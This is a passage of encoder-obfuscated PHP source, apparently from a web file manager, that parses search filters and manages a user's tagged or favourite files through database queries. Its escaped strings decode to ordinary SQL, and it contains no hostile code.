0, intval($İÚ»½…º)); return $ñÍ¢ñÊÉ; } private function _listSearchBindPinyin($ËÉÔÛ¶ù, &$»º÷…òì, &$Ş—•úŞ) { $Š™ï»¸ =& $_SERVER[±³—úê]; if (!isset($ËÉÔÛ¶ù[$Š™ï»¸[2073]]) || !$ËÉÔÛ¶ù[$Š™ï»¸[2073]]) { return; } if (!Input::check($ËÉÔÛ¶ù[$Š™ï»¸[2073]], $Š™ï»¸[404]) || strlen($ËÉÔÛ¶ù[$Š™ï»¸[2073]]) < 2) { return; } $ãäÍïıé = "\114\x45\106\x54\40\112\x4f\x49\116\x20{$this->tablePrefix}\x69\157\137\163\157\165\162\x63\x65\x5f\155\x65\x74\141\40\x6d\x65\164\141\x20\x6f\x6e\x20\163\157\x75\x72\143\x65\x2e\163\x6f\165\x72\x63\x65\x49\104\40\x3d\40\155\145\164\x61\x2e\163\x6f\x75\162\143\x65\x49\104"; $ÉöğıÃÀ = array(); $Ş—•úŞ = str_replace(array($Š™ï»¸[221], $Š™ï»¸[53], $Š™ï»¸[2248]), $Š™ï»¸[12], $Ş—•úŞ); $Ş—•úŞ = $Š™ï»¸[522] . str_replace($Š™ï»¸[50], $Š™ï»¸[523], $Ş—•úŞ); $œû×‹ø = $»º÷…òì[$Š™ï»¸[32]]; unset($»º÷…òì[$Š™ï»¸[32]]); foreach ($»º÷…òì as $ë³ıé”ä => $Ëü¤Õ¶ı) { $ÉöğıÃÀ[$Š™ï»¸[522] . $ë³ıé”ä] = $Ëü¤Õ¶ı; } foreach ($œû×‹ø as $·ıˆ¾ñ) { $ÉöğıÃÀ[] = array($Š™ï»¸[527] => $·ıˆ¾ñ, $Š™ï»¸[1079] => $Š™ï»¸[2077], array($Š™ï»¸[2249] => $·ıˆ¾ñ, $Š™ï»¸[2250] => array($Š™ï»¸[7], array($Š™ï»¸[549], $Š™ï»¸[548])))); } $this->join($ãäÍïıé); $»º÷…òì = $ÉöğıÃÀ; } private function _parseSearchWhere($Û¿ğèú…) { $õû›¼† =& $_SERVER[±³—úê]; $ˆ€Ğ÷® = array(); if (isset($Û¿ğèú…[$õû›¼†[840]]) && $Û¿ğèú…[$õû›¼†[840]]) { $ˆ€Ğ÷®[$õû›¼†[88]] = array($õû›¼†[2251], $Û¿ğèú…[$õû›¼†[840]]); } if (isset($Û¿ğèú…[$õû›¼†[841]]) && $Û¿ğèú…[$õû›¼†[841]]) { $…¿ºÓ³‰ = array($õû›¼†[2252], $Û¿ğèú…[$õû›¼†[841]]); if ($ˆ€Ğ÷®[$õû›¼†[88]]) { $ˆ€Ğ÷®[$õû›¼†[88]] = array($ˆ€Ğ÷®[$õû›¼†[88]], $…¿ºÓ³‰, $õû›¼†[2253]); } else { $ˆ€Ğ÷®[$õû›¼†[88]] = $…¿ºÓ³‰; } } if (isset($Û¿ğèú…[$õû›¼†[2245]]) && $Û¿ğèú…[$õû›¼†[2245]] > 0) { $ˆ€Ğ÷®[$õû›¼†[79]] = array($õû›¼†[2251], $Û¿ğèú…[$õû›¼†[2245]]); } if (isset($Û¿ğèú…[$õû›¼†[2246]]) && $Û¿ğèú…[$õû›¼†[2246]]) { $…¿ºÓ³‰ = array($õû›¼†[2252], $Û¿ğèú…[$õû›¼†[2246]]); if ($ˆ€Ğ÷®[$õû›¼†[79]]) { $ˆ€Ğ÷®[$õû›¼†[79]] = array($ˆ€Ğ÷®[$õû›¼†[79]], $…¿ºÓ³‰, $õû›¼†[2253]); } else { $ˆ€Ğ÷®[$õû›¼†[79]] = $…¿ºÓ³‰; } } if (isset($Û¿ğèú…[$õû›¼†[676]]) && $Û¿ğèú…[$õû›¼†[676]]) { $ˆ€Ğ÷®[] = array($õû›¼†[540] => $Û¿ğèú…[$õû›¼†[676]], $õû›¼†[538] => $Û¿ğèú…[$õû›¼†[676]], $õû›¼†[1079] => $õû›¼†[2077]); } if (isset($Û¿ğèú…[$õû›¼†[497]]) && $Û¿ğèú…[$õû›¼†[497]]) { $Á­±ê = $Û¿ğèú…[$õû›¼†[497]]; if ($Á­±ê == $õû›¼†[78]) { $ˆ€Ğ÷®[$õû›¼†[496]] = 1; } else { if ($Á­±ê == $õû›¼†[2254]) { $ˆ€Ğ÷®[$õû›¼†[496]] = 0; } else { if ($Á­±ê) { $Á­±ê = is_array($Á­±ê) ? $Á­±ê : explode($õû›¼†[50], $Á­±ê); $ˆ€Ğ÷®[$õû›¼†[497]] = array($õû›¼†[503], $Á­±ê); $ˆ€Ğ÷®[$õû›¼†[496]] = 0; } } } } $this->_parseSearchParent($Û¿ğèú…, $ˆ€Ğ÷®); if (isset($Û¿ğèú…[$õû›¼†[2073]]) && trim($Û¿ğèú…[$õû›¼†[2073]])) { $æ¢Ä°ÉÍ = trim($Û¿ğèú…[$õû›¼†[2073]]); $ö‘éŠ™ù = explode($õû›¼†[53], $æ¢Ä°ÉÍ); if (strlen($æ¢Ä°ÉÍ) > 2 && (substr($æ¢Ä°ÉÍ, 0, 1) == $õû›¼†[121] && substr($æ¢Ä°ÉÍ, -1) == $õû›¼†[121]) || substr($æ¢Ä°ÉÍ, 0, 1) == $õû›¼†[58] && substr($æ¢Ä°ÉÍ, -1) == $õû›¼†[58]) { $æ¢Ä°ÉÍ = substr($æ¢Ä°ÉÍ, 1, -1); $ö‘éŠ™ù = array($æ¢Ä°ÉÍ); } $ˆ€Ğ÷®[$õû›¼†[32]] = array(array($õû›¼†[626], $õû›¼†[2075] . $æ¢Ä°ÉÍ . $õû›¼†[2075])); if (count($ö‘éŠ™ù) > 1) { $ˆ€Ğ÷®[$õû›¼†[32]] = array(); foreach ($ö‘éŠ™ù as $áÂÇÆäè) { if (!trim($áÂÇÆäè)) { continue; } $ˆ€Ğ÷®[$õû›¼†[32]][] = array($õû›¼†[626], $õû›¼†[2075] . trim($áÂÇÆäè) . $õû›¼†[2075]); } } } return $ˆ€Ğ÷®; } private function _parseSearchParent($ ›ŠíŒê, &$Í­Í™¬) { $³ÖÓùÏ† =& $_SERVER[±³—úê]; if (!isset($ ›ŠíŒê[$³ÖÓùÏ†[192]]) || !$ ›ŠíŒê[$³ÖÓùÏ†[192]]) { return; } $¾²›© = $this->pathInfo($ ›ŠíŒê[$³ÖÓùÏ†[192]]); $‰…Ñ•ãÃ = $¾²›©[$³ÖÓùÏ†[192]] . $³ÖÓùÏ†[12] === $³ÖÓùÏ†[240]; $éÄæ§‰ú = $¾²›©[$³ÖÓùÏ†[190]] == $³ÖÓùÏ†[589]; if ($¾²›©[$³ÖÓùÏ†[605]] == $³ÖÓùÏ†[606]) { $÷Æ›ù± = $this->sourceInfo($ ›ŠíŒê[$³ÖÓùÏ†[192]]); $¾²›©[$³ÖÓùÏ†[595]] = $÷Æ›ù±[$³ÖÓùÏ†[595]]; } $Í­Í™¬[$³ÖÓùÏ†[666]] = array($³ÖÓùÏ†[626], $¾²›©[$³ÖÓùÏ†[595]] . $ ›ŠíŒê[$³ÖÓùÏ†[192]] . $³ÖÓùÏ†[627]); $‘Ò¼ŸÌ = isset($ ›ŠíŒê[$³ÖÓùÏ†[1933]]) && in_array($³ÖÓùÏ†[589], $ ›ŠíŒê[$³ÖÓùÏ†[1933]]); if (!$‘Ò¼ŸÌ || !$éÄæ§‰ú || !$‰…Ñ•ãÃ || !$¾²›©[$³ÖÓùÏ†[498]]) { return; } if (!AuthModel::authCheckRoot($¾²›©[$³ÖÓùÏ†[498]][$³ÖÓùÏ†[499]])) { return; } $ıÁñ²¥Ÿ = $¾²›©[$³ÖÓùÏ†[580]] . $³ÖÓùÏ†[12]; if ($ıÁñ²¥Ÿ == $³ÖÓùÏ†[91]) { unset($Í­Í™¬[$³ÖÓùÏ†[666]]); $Í­Í™¬[$³ÖÓùÏ†[190]] = self::TYPE_GROUP; return; } $Ï‚Øš‚¡ = Model($³ÖÓùÏ†[596])->groupChildrenAll($ıÁñ²¥Ÿ); $•Êèñºõ = count($Ï‚Øš‚¡); if ($•Êèñºõ <= 1) { return; } $­È­¨¶ = array($³ÖÓùÏ†[192] => 0, $³ÖÓùÏ†[190] => self::TYPE_GROUP, $³ÖÓùÏ†[580] => array($³ÖÓùÏ†[7], $Ï‚Øš‚¡)); $Æ¾ÖíÑ = $this->field($³ÖÓùÏ†[2255])->where($­È­¨¶)->limit($•Êèñºõ)->select(); $Í­Í™¬[$³ÖÓùÏ†[666]] = array(); foreach ($Æ¾ÖíÑ as $îÓß´›) { $Í­Í™¬[$³ÖÓùÏ†[666]][] = array($³ÖÓùÏ†[626], $³ÖÓùÏ†[604] . $îÓß´›[$³ÖÓùÏ†[193]] . $³ÖÓùÏ†[627]); } $Í­Í™¬[$³ÖÓùÏ†[666]][] = $³ÖÓùÏ†[2077]; } } goto B–Â˜ø‘§; eÔå‹×±‘Á: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($ò–ñâÄ´) { $¦ÄœóÎ­ =& $_SERVER[±³—úê]; return array($¦ÄœóÎ­[2090] => array($¦ÄœóÎ­[2513] . USER_ID, $¦ÄœóÎ­[2091])); } protected function listData() { $ÏñÍ±‘ù =& $_SERVER[±³—úê]; $ºìËâÅ˜ = array($ÏñÍ±‘ù[1766] => USER_ID, $ÏñÍ±‘ù[568] => array($ÏñÍ±‘ù[2094], 0)); $ÊÍñïÒ˜ = $ÏñÍ±‘ù[2514]; $õß¡‘¾ = $this->field($ÊÍñïÒ˜)->where($ºìËâÅ˜)->order($ÏñÍ±‘ù[2097])->select(); return $õß¡‘¾ ? $õß¡‘¾ : array(); } protected function addToTag($çåí‚Ò, $¨ŸÔÃ×õ) { $ªãõ“µ =& $_SERVER[±³—úê]; if (!Model($ªãõ“µ[2243])->listData($¨ŸÔÃ×õ)) { return !1; } if (is_numeric($çåí‚Ò)) { $Ô»ÕìŞı = Model($ªãõ“µ[905])->pathInfo($çåí‚Ò); if (!$Ô»ÕìŞı) { return !1; } } else { $Ô»ÕìŞı = IO::infoSimple($çåí‚Ò); if (!$Ô»ÕìŞı) { return !1; } $Èö²ø¨¢ = $Ô»ÕìŞı[$ªãõ“µ[32]]; $”öÎÒšƒ = $Ô»ÕìŞı[$ªãõ“µ[33]]; if (isset($Ô»ÕìŞı[$ªãõ“µ[496]])) { $”öÎÒšƒ = $Ô»ÕìŞı[$ªãõ“µ[496]] == $ªãõ“µ[91] ? $ªãõ“µ[78] : $ªãõ“µ[242]; } } $¶éŞ¨ÅÃ = array($ªãõ“µ[1766] => USER_ID, $ªãõ“µ[568] => $¨ŸÔÃ×õ, $ªãõ“µ[506] => $çåí‚Ò, $ªãõ“µ[507] => $”öÎÒšƒ ? $”öÎÒšƒ : $ªãõ“µ[501], $ªãõ“µ[505] => $Èö²ø¨¢ ? $Èö²ø¨¢ : $ªãõ“µ[12], $ªãõ“µ[1979] => 0); if ($this->where($¶éŞ¨ÅÃ)->find()) { return !1; } return $this->add($¶éŞ¨ÅÃ); } protected function removeFromTag($¥Ç¦Ğ•, $—À˜±²í) { $®è¦Äš =& $_SERVER[±³—úê]; if (!Model($®è¦Äš[2243])->listData($—À˜±²í)) { return !1; } if (is_array($¥Ç¦Ğ•)) { $¥Ç¦Ğ• = array($®è¦Äš[7], $¥Ç¦Ğ•); } $àî­› = array($®è¦Äš[1766] => USER_ID, $®è¦Äš[568] => $—À˜±²í, $®è¦Äš[506] => $¥Ç¦Ğ•); return $this->where($àî­›)->delete(); } protected function removeByTag($§¸¨­À®) { $¥®‰¨’Ú =& $_SERVER[±³—úê]; if (!$§¸¨­À®) { return !1; } $òÇÇ§ˆ = array($¥®‰¨’Ú[1766] => USER_ID, $¥®‰¨’Ú[568] => $§¸¨­À®); return $this->where($òÇÇ§ˆ)->delete(); } protected function removeBySource($åñ—œØÜ) { $·­í­»­ =& $_SERVER[±³—úê]; if (is_array($åñ—œØÜ)) { $åñ—œØÜ = array($·­í­»­[7], $åñ—œØÜ); } $‚†ªå× = array($·­í­»­[1766] => USER_ID, $·­í­»­[568] => array($·­í­»­[1093], 0), $·­í­»­[506] => $åñ—œØÜ); return $this->where($‚†ªå×)->delete(); } }